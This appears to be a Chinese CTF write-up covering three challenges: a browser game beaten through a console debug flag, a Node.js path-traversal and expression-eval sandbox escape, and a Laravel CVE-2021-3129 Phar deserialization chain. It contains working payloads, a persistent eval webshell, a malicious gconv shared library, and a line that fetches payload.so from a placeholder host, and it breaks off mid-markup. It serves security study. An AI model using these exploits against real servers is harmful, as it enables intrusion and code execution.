        <content type="html"><![CDATA[<h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>审计一下游戏的 js 代码。发现作为最终关卡的 boss 继承了 Kill 的方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Kill()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>.Kill();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.type)</span><br><span class="line">        &#123;</span><br><span class="line">            boss = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (isFinalLevel)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// player win</span></span><br><span class="line">                <span class="keyword">new</span> Pickup(<span class="built_in">this</span>.pos, <span class="number">2</span>);</span><br><span class="line">                SpawnPickups(<span class="built_in">this</span>.pos,<span class="number">1</span>,<span class="number">40</span>);</span><br><span class="line">                winTimer.Set();</span><br><span class="line">                <span class="built_in">localStorage</span>.kbap_warp=<span class="number">0</span>;</span><br><span class="line">                <span class="built_in">localStorage</span>.kbap_won=<span class="number">1</span>;</span><br><span class="line">                speedRunTime=speedRunTime|<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (speedRunMode &amp;&amp; (!speedRunBestTime || speedRunTime &lt; speedRunBestTime))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// track best speed run time</span></span><br><span class="line">                    speedRunBestTime = speedRunTime;</span><br><span class="line">                    <span class="built_in">localStorage</span>.kbap_bestTime=speedRunBestTime;</span><br><span class="line">                &#125;</span><br><span class="line">                PlaySound(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同时又有如下代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug key N to load next level</span></span><br><span class="line">    <span class="keyword">if</span> (debug &amp;&amp; KeyWasPressed(<span class="number">78</span>))</span><br><span class="line">        loadNextLevel = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nextLevel = (nextLevel+<span class="number">1</span>)%<span class="number">11</span></span><br></pre></td></tr></table></figure><p>很容易看出总共有 10 关，因此在 Console 中令 <code>debug=1</code> 后直接一直按 N 跳到第十关，再执行 <code>boss.Kill()</code> 即可杀死最终 boss 获得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615693694736.1d9314ea61b76a67ef7c1a12a18127776595d219.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_game_is_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>源代码页面审计到如下路由。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> p = req.query.path || file;</span><br><span class="line">  p = path.resolve(path.dirname(file), p);</span><br><span class="line">  <span class="keyword">if</span> (p.includes(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">    res.send(<span class="string">&quot;no flag!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.sendFile(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>尝试利用这个路由读取一些文件。使用 <code>.../source?path=/etc/passwd</code> 可以读到对应的文件，注意到下面两行，这说明很可能没有 bash。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node:x:1000:1000:Linux User,,,:&#x2F;home&#x2F;node:&#x2F;bin&#x2F;sh</span><br><span class="line">ctf:x:1001:1001:Linux User,,,:&#x2F;home&#x2F;ctf:&#x2F;bin&#x2F;ash</span><br></pre></td></tr></table></figure><p>使用 <code>.../source?path=/proc/self/cwd/package.json</code> 可以读到如下内容。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Description&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;src/index.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;module&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node src/index.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build:native&quot;</span>: <span class="string">&quot;node-gyp rebuild&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build:native:dev&quot;</span>: <span class="string">&quot;node-gyp rebuild --debug&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;bindings&quot;</span>: <span class="string">&quot;^1.5.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;expression-eval&quot;</span>: <span class="string">&quot;^4.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;node-addon-api&quot;</span>: <span class="string">&quot;^3.0.2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;seval&quot;</span>: <span class="string">&quot;^2.0.1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@types/express&quot;</span>: <span class="string">&quot;^4.17.8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@types/node&quot;</span>: <span class="string">&quot;^14.10.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;node-gyp&quot;</span>: <span class="string">&quot;^7.1.2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;prettier&quot;</span>: <span class="string">&quot;^2.0.5&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合源码中的 addon，bindings 和这里的 <code>node-gyp</code> 可以知道这题很可能涉及到 C++ 写的 NodeJS 模块。</p><blockquote><p>参考文章：<a href="https://segmentfault.com/a/1190000016565228?utm_source=tag-newest">https://segmentfault.com/a/1190000016565228?utm_source=tag-newest</a></p></blockquote><p>结合文章中的描述可以得知存在 binding.gyp 文件和编译之后的 addon.node 文件于 <code>.../build/Release/</code> 下。使用一样的方法将其读取出来可以得到一个二进制文件。</p><h4 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h4><p>再看源码，可以发现如下验证逻辑。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&quot;/eval&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.body.e;</span><br><span class="line">  <span class="keyword">const</span> code = req.body.code;</span><br><span class="line">  <span class="keyword">if</span> (!e || !code) &#123;</span><br><span class="line">    res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (addon.verify(code)) &#123;</span><br><span class="line">      res.send(<span class="built_in">String</span>(eval_(parse(e))));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    res.send(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>只有想办法拿到 <code>verify(code)</code> 中正确的 <code>code</code> 才有可能 RCE，于是就要分析之前得到的二进制文件。这里拜托逆向大佬 <a href="https://usher2008.github.io/">@usher</a> 对文件进行了动态调试，成功拿到了对应的字符串 <code>yoshino-s_want_a_gf,qq1735439536</code>。</p><h4 id="expression-eval-eval"><a href="#expression-eval-eval" class="headerlink" title="expression-eval eval"></a>expression-eval eval</h4><p>根据读到的文件可以知道作者使用了 <code>&quot;seval&quot;: &quot;^2.0.1&quot;</code> 这个包，使用 NPM 查询可以找到这个包的源码。（虽然不知道到底在哪里用到了）</p><blockquote><p>GitHub Repo: <a href="https://github.com/tritiumNetworks/SafeEval">https://github.com/tritiumNetworks/SafeEval</a></p></blockquote><p>稍微测试一下可以发现使用 <code>(1)[&quot;constructor&quot;][&quot;constructor&quot;]</code> 可以导出一个 Function。此时就可以使用这个位置来进行指令执行了。构造出如下 payload 发现可以成功利用并弹出计算器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pkg = <span class="built_in">require</span>(<span class="string">&quot;expression-eval&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> ast = pkg.parse(<span class="string">&#x27;(1)[&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(global.process.mainModule.constructor._load(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;))&quot;)()&#x27;</span>);</span><br><span class="line">pkg.eval(ast);</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615788854110.57b0e9da3ad764b26f18a256eefb2e7faf83bf55.png"></p><p>但是在靶机环境中经过测试可以发现 <code>require</code> 和 <code>global.process.mainModule</code> 都是 undefined。因此无法通过导出 <code>mainModule</code> 的方式来达成指令执行。探索之后可以发现利用 <code>global.process.binding()</code> 可以导出任意存在的模块。</p><blockquote><p>参考文章：<a href="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</a></p></blockquote><p>尝试导出一个 fs 模块并利用其 <code>readFileSync</code> 的方法来读取文件，但是并没有成功。仅仅使用如下 payload 读到了根目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; this.constructor.constructor(&#39;return this.process.binding&#39;)()(&#39;fs&#39;).readdir(&#39;&#x2F;&#39;, &#123;&#125;, &quot;&quot;,&quot;&quot;, function (err, data) &#123;data&#125;);</span><br><span class="line">a;</span><br><span class="line"></span><br><span class="line">e&#x3D;(1)[&quot;constructor&quot;][&quot;constructor&quot;](&quot;return+String(eval(String.fromCharCode(118,97,114,32,97,32,61,32,116,104,105,115,46,99,111,110,115,116,114,117,99,116,111,114,46,99,111,110,115,116,114,117,99,116,111,114,40,39,114,101,116,117,114,110,32,116,104,105,115,46,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,39,41,40,41,40,39,102,115,39,41,46,114,101,97,100,100,105,114,40,39,47,39,44,32,123,125,44,32,34,34,44,34,34,44,32,102,117,110,99,116,105,111,110,32,40,101,114,114,44,32,100,97,116,97,41,32,123,100,97,116,97,125,41,59,10,97,59)))&quot;)()&amp;code&#x3D;yoshino-s_want_a_gf%2Cqq1735439536</span><br><span class="line"></span><br><span class="line">.dockerenv,app,bin,dev,docker-entrypoint,etc,flag,home,lib,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var</span><br></pre></td></tr></table></figure><p>看题解学到了可以使用 <code>import()</code> 来引入模块，于是可以构造出如下 payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1)[&quot;constructor&quot;][&quot;constructor&quot;](&#39;return+import(&quot;fs&quot;).then(fs&#x3D;&gt;&#123;fs.copyFileSync(&quot;&#x2F;flag&quot;,&quot;&#x2F;tmp&#x2F;tmpf1ag&quot;);&#125;)&#39;)()</span><br></pre></td></tr></table></figure><p>使用 <code>fs.copyFileSync()</code> 将 flag 拷贝到 <code>/tmp</code> 目录下，从而使用第一步的文件读取操作读取到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;74840aad-bd02-4946-b8fc-23ef08db0cd8&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-laravel"><a href="#Easy-laravel" class="headerlink" title="Easy_laravel"></a>Easy_laravel</h3><blockquote><p>简单的漏洞复现</p></blockquote><h4 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a>CVE-2021-3129</h4><blockquote><p>参考文章：<a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p></blockquote><p>关键点在于 Controller 会调用到的 <code>run()</code> 方法。当走到 <code>makeOptional()</code> 方法的时候会触发到 <code>file_get_contents()</code>，此时便可以借助他去触发 Phar 反序列化。与此同时，传入的参数会出现在 log 中。配合 filter 的操作可以将 log 文件变成合法的 Phar 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961629058.ff56c3948b1747cf04f49ed7f7bad2fd2a5c4b9a.png"></p><h4 id="Phar-反序列化链子"><a href="#Phar-反序列化链子" class="headerlink" title="Phar 反序列化链子"></a>Phar 反序列化链子</h4><p>简单搜索可以发现 MockClass.php 下出现了一个 <code>eval</code>。只需要控制 <code>$this-&gt;mockName</code> 为不存在的类并在 <code>$this-&gt;classCode</code> 中填充欲执行代码即可。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961629952.6c68eb6eb1e85804fb8b64840c6062abe49b10ec.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">MockClass</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">classCode</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$mockName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;classCode = <span class="string">&quot;phpinfo(); eval(filter_input(INPUT_GET,\&quot;h3x\&quot;)); echo &#x27;See you in the Unserialize!&#x27;;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mockName = <span class="string">&quot;undefinedMock&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着找一下可能触发上述 <code>eval</code> 的函数。可以在 HigherOrderMessage.php 下找到如下 <code>__call()</code> 魔法函数。此时控制 <code>$this-&gt;mock</code> 为一个 MockClass 对象，<code>$this-&gt;method</code> 为 generate 即可触发到上述 <code>eval()</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961630348.04770e31ffde2fb57292ed3a72d129c122fce33e.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">class</span> <span class="title">HigherOrderMessage</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">mock</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$mock</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mock = <span class="variable">$mock</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="string">&quot;generate&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用如下位于 ImportConfigurator.php 的析构函数可以轻松触发到上述的 <code>__call()</code> 方法，只需要 <code>$this-&gt;parent</code> 为 HigherOrderMessage 对象，此时其类下不存在 <code>addCollection()</code> 方法，即可触发到 <code>__call()</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615961630753.bc1a8bef0adb58e3f4df7d73e81c9989b47526b3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$route</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parent</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$parent</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">&quot;undefinedRoute&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了完整的反序列化链子，接下来只需要构造链子并打包成 Phar 就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MakePhar</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">HigherOrderMessage</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Phar</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">MockClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>\<span class="title">ImportConfigurator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MakePhar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$mockClass</span> = <span class="keyword">new</span> MockClass();</span><br><span class="line">        <span class="variable">$higherOrderMessage</span> = <span class="keyword">new</span> HigherOrderMessage(<span class="variable">$mockClass</span>);</span><br><span class="line">        <span class="variable">$importConfigurator</span> = <span class="keyword">new</span> ImportConfigurator(<span class="variable">$higherOrderMessage</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;triggerLog1.phar&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$importConfigurator</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">function</span> <span class="title">MakePhar</span>\<span class="title">MakePhar</span>;</span><br><span class="line"></span><br><span class="line">    MakePhar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发射载荷"><a href="#发射载荷" class="headerlink" title="发射载荷"></a>发射载荷</h4><p>按照参考文章中的说法，需要先将 Phar 包转换成特定的格式，写一段脚本来达成这个目的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TransferEncodePhar</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$raw</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$raw</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$result</span>[<span class="variable">$i</span>] = <span class="string">&quot;=&quot;</span> . strtoupper(dechex(ord(<span class="variable">$raw</span>[<span class="variable">$i</span>]))) . <span class="string">&quot;=00&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照参考文章的姿势将 Phar 包传上去触发。此时即可得到一个一次可用的 <code>eval()</code>。此时将 Phar 包保存起来生成新的 Phar 包，在新的包中写指令将原本的 Phar 包写入新的 log 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$triggerPhar1</span> = base64_encode(file_get_contents(<span class="string">&quot;./triggerLog.phar&quot;</span>));</span><br><span class="line"><span class="keyword">$this</span>-&gt;classCode = <span class="string">&quot;phpinfo(); echo &#x27;See you in the Unserialize!&#x27;; file_put_contents(&#x27;/var/www/html/storage/logs/h3x.log&#x27;,base64_decode(&#x27;<span class="subst">&#123;$triggerPhar1&#125;</span>&#x27;));&quot;</span>;</span><br></pre></td></tr></table></figure><p>将新的 Phar 包以一样的套路上传，便获得了一个可多次执行的 <code>eval()</code>，此处为 <code>h3x.log</code>。</p><h4 id="伪协议-convert-iconv-触发"><a href="#伪协议-convert-iconv-触发" class="headerlink" title="伪协议 convert.iconv 触发"></a>伪协议 convert.iconv 触发</h4><blockquote><p>参考文章：<a href="https://xz.aliyun.com/t/8669">https://xz.aliyun.com/t/8669</a></p></blockquote><p>编写 payload.c 如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  system(<span class="string">&quot;/readflag&gt;/tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>gcc payload.c -o payload.so -shared -fPIC</code> 编译出 payload.so。</p><p>构造 gconv-modules 如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br><span class="line">module  INTERNAL    PAYLOAD&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br></pre></td></tr></table></figure><p>将二者上传到服务器上获取直链，然后在上一步获取的 <code>eval</code> 处将内容下载到靶机上。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;execute-solution?h3x&#x3D;file_put_contents(&quot;&#x2F;tmp&#x2F;payload.so&quot;,file_get_contents(&quot;http:&#x2F;&#x2F;YOUR_HOST&#x2F;payload.so&quot;));</span><br></pre></td></tr></table></figure><p>完成这一步之后使用 <code>var_dump(scanfir(&quot;/tmp&quot;));</code> 应该可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span 